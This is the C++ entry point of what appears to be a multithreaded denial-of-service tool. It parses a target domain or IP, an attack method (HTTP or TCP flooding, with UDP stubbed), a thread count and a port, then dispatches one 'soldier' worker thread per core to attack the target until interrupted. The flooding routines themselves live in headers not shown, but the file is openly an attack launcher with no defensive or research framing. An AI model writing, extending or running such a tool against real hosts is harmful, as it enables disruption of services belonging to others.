#include <csignal>

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>

#include "spdlog/spdlog.h"
#include "spdlog/sinks/stdout_color_sinks.h"
#include "args-parser/all.hpp"

#include "api_interface.h"
#include "config.h"
#include "solider.h"
#include "multithread.h"

static TaskController g_mainTask;

using namespace Args;
namespace spd = spdlog;

void signalHanlder(int signum) 
{
	spd::get("console")->info("Stoping");
	g_mainTask.StopExecution();
}

int main(int argc, char **argv)
{
	signal(SIGTERM, signalHanlder);
	std::signal(SIGINT, signalHanlder);
	std::signal(SIGHUP, signalHanlder);

	CmdLine cmd(argc, argv);
	try
	{
		cmd.addArgWithNameOnly("target", true, true, "Domain or IP of target")
			.addArgWithNameOnly("method", true, true, "Method to use")
			.addArgWithNameOnly("threads", true, false, "Count of threads to use")
			.addArgWithNameOnly("port", true, false, "Port to attack");
		cmd.parse();
	}
	catch(const BaseException &x)
	{
		std::cerr << x.what() << ": " << x.desc() << std::endl;
		return 0;
	}

	auto console = spd::stdout_color_mt("console");

	const std::string target = cmd.value("--target");
	std::optional<int> port{std::nullopt};
	if(cmd.isDefined("--port"))
	{
		try
		{
			port = std::stoi(cmd.value("--port"));
		}
		catch(...)
		{
			console->critical("Failed to parse port number");
			return -1;
		}
	}

	Informator::AttackMethod attackMethod;
	const std::string methodString = cmd.value("--method");
	if(methodString == "http")
	{
		attackMethod = Informator::AttackMethod::HTTPAttack;
	}
	else if(methodString == "tcp")
	{
		attackMethod = Informator::AttackMethod::TCPAttack;
		if(!port)
		{
			console->critical("TCP attack should have port!");
			return -1;
		}
	}
	else if(methodString == "udp")
	{
		console->error("Not implemented yet");
		return -1;
	}
	else
	{
		console->error("Failed to parse: {} to known methods!", methodString);
		return -1;
	}


	size_t maxThreads = 
		std::thread::hardware_concurrency() == 0 ? 2 : std::thread::hardware_concurrency();

	if(cmd.isDefined("--threads"))
	{
		const std::string threadsString = cmd.value("--threads");
		try
		{
			maxThreads = std::stoull(threadsString);
		}
		catch(...)
		{
			console->error("Failed to parse {} to number", threadsString);
			return -1;
		}
	}

	console->info("Beggining attack using {} method", methodString);
	console->info("Dispathicng {} soliders", maxThreads);

	std::vector<Solider> squad;
	squad.reserve(maxThreads);

	for(size_t i = 0; i < maxThreads; i++)
	{
		squad.emplace_back(attackMethod, target, port.value_or(0))
			.StartExecution();
	}

	while(!g_mainTask.ShouldStop()) { }

	for(auto &solider : squad)
	{
		solider.StopExecution();
	}

	console->info("Succesfully stoped");
	spd::drop_all();
}
